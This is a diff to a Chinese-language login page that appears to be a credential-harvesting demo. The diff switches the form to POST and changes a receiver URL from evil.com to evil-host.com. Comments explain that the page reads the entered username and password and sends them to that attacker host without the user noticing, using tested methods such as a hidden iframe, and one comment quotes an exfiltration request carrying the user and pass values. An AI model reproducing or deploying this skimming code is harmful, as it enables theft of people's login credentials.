@@ -28,7 +28,7 @@
 
 <div style="min-width: 1200px; max-width: 1500px; margin: 10px auto;">
     <div class="row" style="margin-top: 30px;margin-bottom: 60px;">
-    <form id="loginform" class="form-horizontal col-sm-8 col-sm-offset-2" method="get" action="./admin.html">
+    <form id="loginform" class="form-horizontal col-sm-8 col-sm-offset-2" method="post" action="./admin.html">
         <fieldset>
             <legend style="margin-bottom: 60px;">用户登录</legend>
             <div class="form-group">
@@ -97,7 +97,7 @@ var pass = document.forms[0].elements[0].elements[1].value;
 // 接收data的域名 最好用https协议
 // 因为在https站点下无法发送http请求.
 // Mixed Content: The page at 'https://1135.github.io/sites/0/login.html' was loaded over HTTPS, but requested an insecure image 'http://evil.com/cred_data?user=00&pass=00'. This content should also be served over HTTPS.
-var receiver_url = "https://evil.com/i_need_data";
+var receiver_url = "https://evil-host.com/i_need_data";
 
 // 发送内容的方式很多 以下2种都经过了测试 可以无感知获取到表单数据 可以同时使用.
 // 发送内容 方式1: 创建iframe标签
